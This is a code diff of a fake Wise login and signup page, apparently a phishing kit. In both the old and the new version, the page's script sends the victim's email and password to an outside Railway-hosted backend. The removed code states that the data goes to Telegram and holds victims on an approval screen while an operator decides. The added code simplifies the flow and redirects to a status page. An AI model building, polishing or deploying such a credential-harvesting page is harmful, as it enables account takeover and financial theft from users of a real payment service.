@@ -87,7 +87,6 @@
             width: auto;
         }
 
-        /* Close button (X) - kept for original look */
         .close-btn {
             background: none;
             border: none;
@@ -179,7 +178,6 @@
             background: #ffffff;
         }
 
-        /* ===== CLEAN INPUTS - NO PLACEHOLDER TEXT ===== */
         .form-group input::placeholder {
             color: transparent;
         }
@@ -277,7 +275,6 @@
             transform: scale(0.98);
         }
 
-        /* ===== REAL GOOGLE BUTTON STYLING ===== */
         .social-btn.google {
             background: #ffffff;
             border: 1.5px solid #dce0e6;
@@ -377,217 +374,21 @@
         .layout {
             animation: fadeInUp 0.5s ease forwards;
         }
-
-        /* ===== TOAST ===== */
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            padding: 14px 28px;
-            border-radius: 14px;
-            background: #163300;
-            color: #9afe00;
-            font-weight: 600;
-            font-size: 14px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-            opacity: 0;
-            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-
-        .toast i {
-            font-size: 18px;
-        }
-
-        .toast.success {
-            background: #163300;
-            color: #9afe00;
-        }
-
-        .toast.error {
-            background: #e74c3c;
-            color: #ffffff;
-        }
-
-        .toast.info {
-            background: #1a2b44;
-            color: #ffffff;
-        }
-
-        /* ============================================
-           WAITING OVERLAY
-           ============================================ */
-        .waiting-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 999;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(4px);
-        }
-
-        .waiting-overlay.active {
-            display: flex;
-        }
-
-        .waiting-box {
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 2.4rem 2.8rem;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        .waiting-box .spinner {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            border: 4px solid #edf0f5;
-            border-top-color: #9afe00;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 1.2rem;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .waiting-box h3 {
-            font-size: 1.4rem;
-            font-weight: 600;
-            color: #0a1e3c;
-            margin-bottom: 0.4rem;
-        }
-
-        .waiting-box p {
-            font-size: 1.1rem;
-            color: #6b7a8f;
-            line-height: 1.5;
-        }
-
-        .waiting-box .dots {
-            display: flex;
-            gap: 0.5rem;
-            justify-content: center;
-            margin-top: 0.8rem;
-        }
-
-        .waiting-box .dots span {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #9afe00;
-            animation: bounce 1.4s ease-in-out infinite;
-        }
-
-        .waiting-box .dots span:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .waiting-box .dots span:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes bounce {
-            0%,
-            80%,
-            100% {
-                transform: scale(0.6);
-                opacity: 0.3;
-            }
-            40% {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        .waiting-box .status-message {
-            margin-top: 1rem;
-            padding: 0.8rem;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 500;
-            display: none;
-        }
-
-        .waiting-box .status-message.approved {
-            display: block;
-            background: #eaf5ef;
-            color: #0a7a4e;
-        }
-
-        .waiting-box .status-message.declined {
-            display: block;
-            background: #fde8ea;
-            color: #b81f2c;
-        }
     </style>
 </head>
 <body>
 
-    <!-- ===== TOAST ===== -->
-    <div id="toast" class="toast">
-        <i class="fas fa-check-circle"></i>
-        <span id="toastMessage">Welcome back!</span>
-    </div>
-
-    <!-- ===== WAITING OVERLAY ===== -->
-    <div class="waiting-overlay" id="waitingOverlay">
-        <div class="waiting-box">
-            <div class="spinner"></div>
-            <h3>Waiting for Approval</h3>
-            <p>Your login request has been sent. Please wait while your request is being reviewed.</p>
-            <div class="dots">
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
-            <div class="status-message" id="statusMessage"></div>
-        </div>
-    </div>
-
     <!-- ===== MAIN LAYOUT ===== -->
     <div class="layout">
 
-        <!-- HEADER - LOGO LEFT, CLOSE BUTTON RIGHT (ORIGINAL POSITION) -->
+        <!-- HEADER - LOGO LEFT, CLOSE BUTTON RIGHT -->
         <header class="header">
             <a href="index.html" title="Go to homepage" class="logo-link">
                 <svg xmlns="http://www.w3.org/2000/svg" width="106" height="24" fill="none" viewBox="0 0 106 24">
                     <path fill="#163300" d="M58.7377.358803h6.4982L61.9668 23.681h-6.4983L58.7377.358803Zm-8.1922 0L46.1602 13.794 44.2465.358803h-4.5448L33.9608 13.7541 33.2433.358803h-6.2991L29.1369 23.681h5.2226L40.818 8.93022 43.0904 23.681h5.1428L56.7249.358803h-6.1794ZM105.103 13.9136H89.6744c.0798 3.0299 1.8937 5.0233 4.5648 5.0233 2.0133 0 3.608-1.0765 4.8439-3.1296l5.2079 2.3674C102.501 21.7017 98.729 24 94.0798 24 87.741 24 83.535 19.7342 83.535 12.8771 83.535 5.34221 88.4784 0 95.4552 0c6.1398 0 10.0068 4.14618 10.0068 10.6046 0 1.0765-.12 2.1528-.359 3.309Zm-5.7807-4.46512c0-2.71095-1.515-4.42525-3.9468-4.42525-2.5117 0-4.5848 1.79402-5.143 4.42525h9.0898ZM6.63326 7.38685 0 15.1389h11.844l1.3309-3.6553H8.09965l3.10105-3.58555.01-.09511L9.19424 4.3319h9.07196l-7.0323 19.3492h4.8124L24.538.358823H2.60021L6.63326 7.38685Zm69.16744-2.3636c2.2923 0 4.301 1.23273 6.0551 3.34565l.9216-6.57488C81.1429.687707 78.9303 0 76 0c-5.8205 0-9.0896 3.40865-9.0896 7.73421 0 2.99999 1.6744 4.83389 4.4252 6.01989l1.3156.598c2.4518 1.0466 3.1097 1.5649 3.1097 2.6712 0 1.1461-1.1064 1.8737-2.7907 1.8737-2.7808.01-5.0332-1.4153-6.7276-3.8472l-.939 6.699C67.2332 23.2201 69.7067 24 72.9702 24c5.5315 0 8.9302-3.1894 8.9302-7.6147 0-3.0099-1.3355-4.9434-4.7044-6.4584l-1.4351-.67772c-1.9934-.88708-2.6711-1.37543-2.6711-2.35216 0-1.05647.9269-1.87377 2.7109-1.87377Z"/>
                 </svg>
             </a>
-
-            <!-- Close button (X) - kept for original look -->
-            <button class="close-btn" aria-label="Close" onclick="showToast('info', '👋 See you soon!')">
+            <button class="close-btn" aria-label="Close" onclick="window.location.href='index.html'">
                 <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                     <path d="m12 13.414-7.293 7.293-1.414-1.414L10.586 12 3.293 4.707l1.414-1.414L12 10.586l7.293-7.293 1.414 1.414L13.414 12l7.293 7.293-1.414 1.414z"/>
                 </svg>
@@ -609,7 +410,6 @@
                 <!-- Login Form -->
                 <form id="loginForm" onsubmit="handleLogin(event)">
 
-                    <!-- Email - CLEAN (no placeholder) -->
                     <div class="form-group">
                         <label for="email">Email address</label>
                         <input
@@ -620,7 +420,6 @@
                         />
                     </div>
 
-                    <!-- Password - CLEAN (no placeholder) -->
                     <div class="form-group">
                         <label for="password">Password</label>
                         <input
@@ -631,16 +430,15 @@
                         />
                     </div>
 
-                    <!-- Login Button -->
                     <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                 </form>
 
                 <!-- Divider -->
                 <div class="divider">or log in with</div>
 
-                <!-- Social Buttons - REAL GOOGLE -->
+                <!-- Social Buttons -->
                 <div class="social-buttons">
-                    <button class="social-btn google" onclick="showToast('info', '🔐 Google login coming soon!')">
+                    <button class="social-btn google" onclick="window.location.href='status.html'">
                         <i class="fab fa-google"></i>
                         <span class="google-text">Log in with Google</span>
                     </button>
@@ -653,7 +451,6 @@
         <div id="signupPage" class="page">
             <div class="content" style="text-align: center;">
 
-                <!-- Headline -->
                 <div class="welcome">
                     <h1>Create your Wise account</h1>
                     <div class="subtitle">
@@ -661,10 +458,8 @@
                     </div>
                 </div>
 
-                <!-- Signup Form -->
                 <form id="signupForm" onsubmit="handleSignup(event)">
 
-                    <!-- Email - CLEAN (no placeholder) -->
                     <div class="form-group" style="text-align: left;">
                         <label for="signupEmail">First, enter your email address</label>
                         <input
@@ -676,16 +471,13 @@
                         />
                     </div>
 
-                    <!-- Next Button -->
                     <button type="submit" class="btn-login" id="signupBtn" style="opacity: 0.58;">Next</button>
                 </form>
 
-                <!-- Divider -->
                 <div class="divider">Or sign up with</div>
 
-                <!-- Social Buttons - REAL GOOGLE -->
                 <div class="social-buttons">
-                    <button class="social-btn google" onclick="showToast('info', '🔐 Google sign-up coming soon!')">
+                    <button class="social-btn google" onclick="window.location.href='status.html'">
                         <i class="fab fa-google"></i>
                         <span class="google-text">Sign up with Google</span>
                     </button>
@@ -701,13 +493,10 @@
 
     </div>
 
-    <!-- ===== JAVASCRIPT ===== -->
+    <!-- ============================================
+    JAVASCRIPT
+    ============================================ -->
     <script>
-        // ============================================
-        // 🔥 BACKEND API URL (Railway)
-        // ============================================
-        const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';
-
         // ============================================
         // PAGE NAVIGATION
         // ============================================
@@ -728,68 +517,27 @@
         }
 
         // ============================================
-        // TOAST
+        // 🔥 LOGIN HANDLER - Direct to status page
         // ============================================
-        let toastTimeout;
-
-        function showToast(type, message) {
-            const toast = document.getElementById('toast');
-            const toastMessage = document.getElementById('toastMessage');
-            toast.className = 'toast ' + type;
-            toastMessage.textContent = message;
-            toast.classList.add('show');
-
-            clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3000);
-        }
-
-        // ============================================
-        // CHECK USER STATUS
-        // ============================================
-        async function checkUserStatus(email) {
-            try {
-                const response = await fetch(API_BASE_URL + '/api/check-status', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ email })
-                });
-
-                const data = await response.json();
-                return data.status;
-            } catch (error) {
-                console.error('Error checking status:', error);
-                return 'pending';
-            }
-        }
-
-        // ============================================
-        // 🔥 LOGIN HANDLER - Sends data to Telegram & checks status
-        // ============================================
-        async function handleLogin(event) {
+        function handleLogin(event) {
             event.preventDefault();
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
             const btn = document.getElementById('loginBtn');
-            const waitingOverlay = document.getElementById('waitingOverlay');
-            const statusMessage = document.getElementById('statusMessage');
 
             // Validation
             if (!email || !password) {
-                showToast('error', '⚠️ Please fill in all fields');
+                alert('⚠️ Please fill in all fields');
                 return;
             }
 
             if (!email.includes('@')) {
-                showToast('error', '⚠️ Please enter a valid email address');
+                alert('⚠️ Please enter a valid email address');
                 return;
             }
 
             if (password.length < 6) {
-                showToast('error', '⚠️ Password must be at least 6 characters');
+                alert('⚠️ Password must be at least 6 characters');
                 return;
             }
 
@@ -798,78 +546,33 @@
             btn.textContent = 'Logging in...';
             btn.style.opacity = '0.6';
 
-            try {
-                console.log('📤 Sending login to:', API_BASE_URL + '/api/login');
+            // ✅ Send login data to backend
+            const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';
 
-                const response = await fetch(API_BASE_URL + '/api/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ email, password })
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    console.log('✅ Login data sent to Telegram. Waiting for approval...');
-
-                    // ✅ Show waiting overlay
-                    waitingOverlay.classList.add('active');
-                    statusMessage.className = 'status-message';
-                    statusMessage.textContent = '';
-
-                    // Reset button
-                    btn.disabled = false;
-                    btn.textContent = 'Log in';
-                    btn.style.opacity = '0.58';
-
-                    // ✅ Start checking status every 3 seconds
-                    let checkInterval = setInterval(async function() {
-                        const status = await checkUserStatus(email);
-                        console.log('📊 Current status:', status);
-
-                        if (status === 'approved') {
-                            clearInterval(checkInterval);
-                            // ✅ User approved - show success and redirect
-                            statusMessage.className = 'status-message approved';
-                            statusMessage.textContent = '✅ Approved! Redirecting...';
-
-                            setTimeout(() => {
-                                waitingOverlay.classList.remove('active');
-                                showToast('success', '✅ Login approved! Welcome back!');
-                                // Redirect to account page
-                                // window.location.href = 'account.html';
-                            }, 1500);
-
-                        } else if (status === 'declined') {
-                            clearInterval(checkInterval);
-                            // ❌ User declined - show error
-                            statusMessage.className = 'status-message declined';
-                            statusMessage.textContent = '❌ Incorrect Credentials';
-
-                            setTimeout(() => {
-                                waitingOverlay.classList.remove('active');
-                                showToast('error', '❌ Incorrect Credentials. Please try again.');
-                            }, 3000);
-                        }
-                        // If still pending, continue checking
-                    }, 3000);
-
-                } else {
-                    showToast('error', '❌ ' + (data.message || 'Login failed. Please try again.'));
-                    btn.disabled = false;
-                    btn.textContent = 'Log in';
-                    btn.style.opacity = '0.58';
-                }
-
-            } catch (error) {
-                console.error('❌ Login error:', error);
-                showToast('error', '❌ Network error. Please check your connection.');
+            fetch(API_BASE_URL + '/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Login sent:', data);
                 btn.disabled = false;
                 btn.textContent = 'Log in';
                 btn.style.opacity = '0.58';
-            }
+
+                // ✅ Always go to status page after login
+                window.location.href = 'status.html';
+            })
+            .catch(error => {
+                console.error('❌ Login error:', error);
+                btn.disabled = false;
+                btn.textContent = 'Log in';
+                btn.style.opacity = '0.58';
+                alert('❌ Network error. Please try again.');
+            });
         }
 
         // ============================================
@@ -881,12 +584,12 @@
             const btn = document.getElementById('signupBtn');
 
             if (!email) {
-                showToast('error', '⚠️ Please enter your email address');
+                alert('⚠️ Please enter your email address');
                 return;
             }
 
             if (!email.includes('@')) {
-                showToast('error', '⚠️ Please enter a valid email address');
+                alert('⚠️ Please enter a valid email address');
                 return;
             }
 
@@ -896,8 +599,9 @@
             setTimeout(() => {
                 btn.disabled = false;
                 btn.textContent = 'Next';
-                showToast('success', '✅ Email verified! Proceeding to next step...');
-            }, 2000);
+                // ✅ Go to status page after signup
+                window.location.href = 'status.html';
+            }, 1500);
         }
 
         // ============================================
@@ -915,9 +619,6 @@
                     signupForm.dispatchEvent(new Event('submit'));
                 }
             }
-            if (e.key === 'Escape') {
-                document.getElementById('toast').classList.remove('show');
-            }
         });
 
         // ============================================
@@ -927,10 +628,9 @@
             document.getElementById('email').focus();
         });
 
-        console.log('🔥 Wise - Login Page (Connected to Backend)');
-        console.log('✅ API URL:', API_BASE_URL);
-        console.log('✅ Login data will be sent to Telegram');
-        console.log('✅ User will wait for approval');
+        console.log('🔥 Wise - Login Page');
+        console.log('✅ No pop-ups - clean login flow');
+        console.log('✅ After login → status.html');
     </script>
 
 </body>
